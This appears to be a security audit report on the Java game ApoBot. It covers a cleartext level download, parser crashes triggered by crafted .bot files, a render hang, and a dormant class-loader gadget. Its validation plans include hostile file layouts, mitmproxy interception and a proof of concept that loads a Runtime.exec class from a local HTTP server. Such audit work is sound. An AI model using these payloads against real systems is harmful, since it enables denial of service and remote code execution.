findings.title: Levels fetched over plain HTTP from apo-games.de in applet deployments
findings.entry_point: Browser loading apoBot.ApoBotApplet sets ApoConstants.B_APPLET=true (org/apogames/ApoApplet.java:37); menu actions then call ApoBotGame.loadLevel(APPLET_LEVEL + "/" + LEVELS[i] + ".bot") (apoBot/game/ApoBotGame.java:154,408) and ApoBotTutorial.init (apoBot/game/ApoBotTutorial.java:43)
findings.sink: java.net.URL.openStream() in org.apogames.ApoIO.readLevel(boolean,String,boolean) (org/apogames/ApoIO.java:220-221), feeding the hand-rolled parser ApoBotLevelIO.readLevel(DataInputStream)
findings.data_path: Button handler ApoBotGame.setMouseFunction("game"/"tutorial") -> setGame()/setTutorial() -> loadLevel(http://apo-games.de/apoBot/levels/<name>.bot) -> ApoBotGame.loadLevel:170 -> ApoBotEditor.loadLevel:61 or io.readLevel -> ApoIO.readLevel(B_APPLET=true,...) -> new URL(fileName).openStream() -> DataInputStream consumed by ApoBotLevelIO.readLevel
findings.attack_scenario: Attacker on the same LAN (or DNS/ARP spoof, or a future compromise of apo-games.de) runs mitmproxy, intercepts the cleartext GET for easy.bot/middle.bot/tutorial.bot, and substitutes an arbitrary byte stream of their choosing. Those bytes become the trusted input to the unchecked binary level parser (see ApoBot-02/03/04), so the attacker controls every int the client parses. Gain: deterministic client-side denial of service of the game JVM; with the parser being non-executing, no code execution is available.
findings.preconditions: Game deployed and played as an applet (B_APPLET=true); attacker positioned for on-path interception of the HTTP session. Desktop distribution instead reads ./levels/*..bot from disk and never touches the network.
findings.validation_plan: Serve the applet locally with B_APPLET=true (or point a hosts-file entry for apo-games.de at 127.0.0.1 while running a netcat/mitmproxy listener). Observe the plaintext request GET /apoBot/levels/easy.bot in the proxy. Return crafted bytes starting with a level count followed by ySize=-1; confirm NegativeArraySizeException in the Java console, proving end-to-end attacker control of parsed data.

findings.title: Unvalidated integers in hand-rolled .bot parser allow negative/huge allocations and crashes
findings.entry_point: Any .bot source: (a) HTTP stream in applet mode via ApoIO.readLevel(true,...) (org/apogames/ApoIO.java:220), or (b) user-selected file via JFileChooser in ApoBotComponent.levelLoad (apoBot/ApoBotComponent.java:120-136, triggered by 'gameLoad'/'editorLoad' buttons, ApoBotGame.java:366-367, ApoBotEditor.java:207-208)
findings.sink: Array allocations new ApoBotLevelLevel[ySize][xSize] (ApoBotLevelIO.java:79) and new int[menuSize] (ApoBotLevelIO.java:94); downstream ApoBotLevel constructor reads menu[0..2] without length check (apoBot/level/ApoBotLevel.java:67-69); ApoBotGame.setLevel allocates new ApoBotEntity[commandsMenu] (apoBot/game/ApoBotGame.java:781) and indexes mainCommands[length-1] (ApoBotGame.java:838)
findings.data_path: loadLevel(String) -> ApoIO.readLevel -> FileInputStream/URL stream -> ApoBotLevelIO.readLevel(DataInputStream): raw readInt() values drive every allocation with zero range checks; EOFException is swallowed (ApoIO.java:225-226) but RuntimeExceptions propagate to the top and abort init/think
findings.attack_scenario: Attacker crafts a .bot file (or MITMs the applet download): size=1, ySize=-1 triggers immediate NegativeArraySizeException; ySize=xSize=30000 forces allocation of ~900M ApoBotLevelLevel slots -> OutOfMemoryError; menuSize=2 makes ApoBotLevel.<init> throw ArrayIndexOutOfBoundsException; commandsMenu=-5 makes ApoBotGame.setLevel throw NegativeArraySizeException, commandsMenu=0 throws AIOOBE at ApoBotGame.java:838. Gain in the stated threat model: reliable crash of the client (annoyance/DoS), and a parsing oracle; no code execution.
findings.preconditions: Desktop: victim opens a hostile .bot via the in-game load dialog, or replaces files under ./levels/ (loaded from System.getProperty("user.dir") at ApoBotGame.java:156,410 and ApoBotTutorial.java:45). Applet: on-path attacker substitutes the HTTP response (ApoBot-01).
findings.validation_plan: With python, build test files: struct.pack('>i',1)+struct.pack('>i',-1)+struct.pack('>i',3) -> launch desktop jar, press gameLoad, select file, confirm 'NegativeArraySizeException' on console; same prefix with ySize/xSize=0x7FFF then menuSize=2 -> ArrayIndexOutOfBoundsException in apoBot.level.ApoBotLevel.<init>; size=1,ySize=20000,xSize=20000 -> heap exhaustion. Each observable confirms the unvalidated-int path.

findings.title: Crafted level start point indexes tile grid out of bounds during render
findings.entry_point: xPoint/yPoint read with raw readInt() in ApoBotLevelIO.readLevel (apoBot/level/ApoBotLevelIO.java:88-89) from a hostile .bot (file via ApoBotComponent.levelLoad:130 or HTTP in applet via ApoBot-01)
findings.sink: Array indexing level.getLevel()[playerY][playerX] in ApoBotComponent.renderPlayer (line 546) and again in ApoBotGame.nextCommand REDYE branch (apoBot/game/ApoBotGame.java:1001-1004)
findings.data_path: ApoBotLevelIO.readLevel -> new ApoBotLevel(levelLevel, new Point(xPoint,yPoint), ...) stored via ApoBotComponent.setLevel:197-199 (player spawned at file-supplied coordinates with no comparison against level dimensions) -> first paint/render tick invokes renderLevel -> renderPlayer:546 -> ArrayIndexOutOfBoundsException on the AWT/thread
findings.attack_scenario: Attacker supplies a syntactically valid .bot whose grid is 10x10 but whose start point is (999999, 999999) or negative. Game accepts the level silently, then throws ArrayIndexOutOfBoundsException on first render; in applet mode this kills the applet, on desktop the game window stops functioning. Pure client-side crash, no privilege gain.
findings.preconditions: Same as ApoBot-02: hostile .bot opened via in-game loader, swapped ./levels file, or MITM'd applet download.
findings.validation_plan: Generate a minimal valid .bot (one 10x10 level, all GROUND_EMPTY) but overwrite the two start-point ints after the tile data with 0x000186A0 (100000). Load via gameLoad; confirm console ArrayIndexOutOfBoundsException originating at apoBot.ApoBotComponent.renderPlayer.

findings.title: Single tile-height int from level file drives near-unbounded render loop (UI hang)
findings.entry_point: Per-tile 'height' int read unvalidated in ApoBotLevelIO.readLevel (apoBot/level/ApoBotLevelIO.java:82-84); ApoBotLevelLevel.setHeight only clamps negatives (apoBot/level/ApoBotLevelLevel.java:56-61), so any positive value up to 2^31-1 survives
findings.sink: Render loops bounded by getHeight(): ApoBotImage.getIBackground (line 116, no culling inside loop, one g.drawImage per iteration) and ApoBotComponent.renderLevel (apoBot/ApoBotComponent.java:501)
findings.data_path: .bot tile record -> ApoBotLevelLevel(ground,height) -> level stored via setLevel -> makeBackground() -> ApoBotImage.getIBackground iterates heightLevel 0..height for that tile, drawing each layer; with height=Integer.MAX_VALUE the loop runs ~2 billion drawImage calls, monopolizing the thread
findings.attack_scenario: Attacker sets one tile's height field to 0x7FFFFFFF in a crafted .bot (or MITM response). On load, the game freezes indefinitely inside getIBackground (jstack shows the thread parked in the loop); user must kill the process. Client-side hang only, but 100% reliable and cheaper for the attacker than memory exhaustion.
findings.preconditions: Hostile .bot reaches the parser (same channels as ApoBot-02). Editor-created levels cap height at 10 (ApoBotEditor.mouseClick, apoBot/game/ApoBotEditor.java:295-297), so only external files exhibit this.
findings.validation_plan: Take a working .bot, patch the height int of tile [0][0] to 2000000000, load it, and observe the freeze; capture jstack showing the stuck frame in apoBot.ApoBotImage.getIBackground. Repeat with height=50000 to measure linear time growth, confirming loop-bound control.

findings.title: Dormant URLClassLoader remote/local class-loading gadget with newInstance (no caller in this variant)
findings.code_excerpt: url = new URL( this.getPath() ); ... URLClassLoader cl = new URLClassLoader( new URL[] { url } ); c = cl.loadClass( this.getClassname() ); return c.newInstance();
findings.entry_point: Constructor arguments (path, classname) supplied by whoever instantiates ApoClassLoader; in applet mode the path is used directly as a URL (ApoClassLoader.java:68), otherwise as a File URI (line 66)
findings.sink: Class.forName-equivalent cl.loadClass(...) followed by c.newInstance() executing the loaded class' no-arg constructor (org/apogames/help/ApoClassLoader.java:73-75)
findings.data_path: new ApoClassLoader(path, classname).getMyClass() -> URLClassLoader over attacker-chosen URL/directory -> loadClass -> newInstance. CRITICAL CAVEAT: a full-text search of all 48 files in this variant finds ZERO callers of ApoClassLoader; the gadget is dead code inherited from the shared org.apogames framework.
findings.attack_scenario: As shipped: none - the class is never referenced. If a sibling variant (or a future edit) wires it to server-controlled data (e.g., 'download extra levels/plugins'), an attacker controlling that URL hosts a .class whose constructor executes arbitrary code with the game's privileges (full user privileges for the desktop app; sandbox-limited for applets). Reported because this exact file is the corpus-wide propagation vector named in the study.
findings.preconditions: Requires a call site instantiating ApoClassLoader with attacker-influenced path/classname - none exists in ApoBot today. Desktop execution additionally requires the victim to run the application (applet version would face the Java plugin sandbox unless signed).
findings.validation_plan: Reproduce absence: rg -n "ApoClassLoader" over the tree returns only the definition file. Prove latent danger: compile a class Exploit{public Exploit(){Runtime.getRuntime().exec("calc")}} served from a local HTTP dir, then in a harness call new ApoClassLoader("http://127.0.0.1:8000/","Exploit").getMyClass() and observe execution - demonstrating that any future caller turns this into RCE.

categories_checked_and_absent: untrusted_deserialization - no java.io.ObjectInputStream anywhere in the variant (grep over all 48 files)
weak_integrity_check - no MessageDigest/MD5/hash or signature verification exists; downloads and files are accepted with no integrity check at all, so there is no broken crypto to report
credential_or_secret_exposure - no passwords, tokens, keys or credentials in source or constants

path_traversal - file paths are built only from hardcoded strings, ApoBotConstants.LEVELS entries, JFileChooser selections, or System.getProperty("user.dir") (ApoBotComponent.java:77, ApoBotGame.java:156,410); no externally supplied string is concatenated into a path
unsafe_native_call - no JNI, System.load/System.loadLibrary, Runtime.exec or ProcessBuilder
information_disclosure - the only outbound traffic is the optional level upload; no personal data or telemetry is collected or transmitted

legacy_sandbox_assumption - Applet entry points exist (org/apogames/ApoApplet.java, ApoAppletBufferedStrategy.java, apoBot/ApoBotApplet.java) but there is no AccessController/doPrivileged or signed-jar trust logic to misuse

client_side_trust - win points are computed purely locally (ApoBotGame.thinkMove, ApoBotGame.java:976) but this variant has NO highscore submission endpoint at all (contrast with save_highscore.php variants), so local cheating has no target to defraud
notes: Source tree is nested oddly under the audit root (corpus/java/ApoBot/Users/eliahilse/Documents/GitHub/B/apogames/Java/ApoBot); all 48 .java files live there. All paths above are relative to the stated SOURCE ROOT. This variant is network-light compared to its siblings: the only network activity is the applet-only level download (http://apo-games.de/apoBot/levels/, double-slash typo in ApoBotGame.java:154/408 producing .../levels//easy.bot - harmless). Shared infrastructure ApoIO.writeLevel contains an HTTP-POST upload branch (org/apogames/ApoIO.java:165-169, HttpURLConnection.setDoOutput(true)) that would submit user content over cleartext HTTP, but it is UNREACHABLE here: the editor save/load buttons are hidden in applet mode (ApoBotGame.setEditor hides buttons 27/28, ApoBotGame.java:282-283) and the JFileChooser is only constructed when !B_APPLET (ApoBotComponent.init, ApoBotComponent.java:75), so levelSave would NPE first - noted for cross-variant comparison rather than reported as a finding. Command-line arguments to ApoBotMain.main are ignored (ApoBotMain.java:25-27). ApoHelp.getCircleCuts prints internal computation to stdout (org/apogames/help/ApoHelp.java:196,198,205) - cosmetic. Findings ApoBot-02/03/04 share one underlying root cause (zero validation in ApoBotLevelIO.readLevel) but have distinct sinks/files/observables (allocation failure, OOB index, unbounded render loop) and were kept separate per the study's sink-level granularity; ApoBotLevelIO.java itself is a structural clone of the per-variant *LevelIO template used across the corpus (extends org.apogames.ApoIO, implements readLevel(DataInputStream)/writeLevel(DataOutputStream)), so parser flaws there likely propagate to every sibling that clones the template.
